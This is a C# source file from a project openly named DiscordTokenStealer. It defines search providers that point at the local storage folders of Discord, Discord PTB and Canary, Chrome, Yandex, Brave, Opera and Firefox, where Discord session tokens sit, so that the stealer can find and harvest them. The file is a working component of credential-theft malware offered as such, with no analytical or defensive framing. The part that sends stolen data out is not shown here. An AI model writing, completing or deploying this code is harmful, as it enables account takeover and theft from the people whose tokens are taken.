using DiscordTokenStealer.Helpers;
using DiscordTokenStealer.DirectorySearchProviders;

namespace DiscordTokenStealer.Services;
public sealed partial class AppDataSearchProvider : DirectorySearchProvider
{
    public AppDataSearchProvider(string directory, string searchPattern = "*.ldb") : base(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), directory), searchPattern)
    {

    }
}

public sealed partial class AppDataSearchProvider
{
    public static readonly AppDataSearchProvider Discord = new AppDataSearchProvider("discord\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider DiscordPTB = new AppDataSearchProvider("discordptb\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider DiscordCanary = new AppDataSearchProvider("discordcanary\\Local Storage\\leveldb");

    public static readonly AppDataSearchProvider Chrome = new AppDataSearchProvider("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider Yandex = new AppDataSearchProvider("Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider Brave = new AppDataSearchProvider("BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider Opera = new AppDataSearchProvider("Opera Software\\Opera Stable\\User Data\\Default\\Local Storage\\leveldb");
    public static readonly AppDataSearchProvider? Firefox = DirectoryHelper.TryFindSubDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"), "storage\\default\\https+++discord.com\\ls", out string? dir) && dir != null ? new AppDataSearchProvider(dir, "*.sqlite") : null;
}